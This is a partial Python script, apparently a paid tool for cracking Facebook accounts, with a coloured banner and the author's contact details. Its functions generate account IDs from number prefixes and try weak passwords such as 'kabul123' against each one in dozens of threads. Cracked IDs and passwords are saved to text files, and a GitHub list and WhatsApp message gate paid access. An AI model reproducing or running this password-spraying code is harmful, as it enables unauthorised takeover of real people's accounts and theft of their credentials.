...
\033[1;36m@@@@@@@@@@@@@@@@@@ \33[32;45mShakir\33[0;m \033[1;36m@@@@@@@@@@@@@@@@@@@@@@@@
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mShinwari\33[0;m\033[1;32m && \033[1;33mShinwari\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m \033[1;32mShakir ullah shinwari\033[1;34m
\033[1;34m     \033[1;35mWhatsAPP     :  \033[1;35m+93704036694
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m PAID
\033[1;32m     \033[1;35mTEAM         :  \033[1;35m SH SH
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 1.0.1
\033[1;32m&&&&&&&&&&&&&&&&&& \33[32;45mShinwari\33[0;m \033[1;32m&&&&&&&&&&&&&&&&&&&&&&
 
       \33[37;41m\t WELCOME TO ShinwariTOOL\33[0;m
 
\033[1;33m☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ \33[1;45mShinwari\33[0;m \033[1;33m☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆\n"""
...
def rehan():
	os.system('xdg-open https://youtube.com/@technicalandhackingsh2625')
	print(logo)
...
def svn_digit():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :9378,9370,9377,9379.ETC')
	lines()
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'afghan123','khan123','۱۲۳۴۵۶','kabul123','100200']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def malik_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'kabul123','100200','200300']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[shakir-OK] '+cid+' | '+ps+'\x1b[1;97m')
                open('shakir-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                open('shakir-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mshakir\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/shshinwari/Shsh/blob/main/Shsh.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Shinwari%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+93704036694?text='+tks),approval()
      time.sleep(0)
      approval()
  except:
    sys.exit()
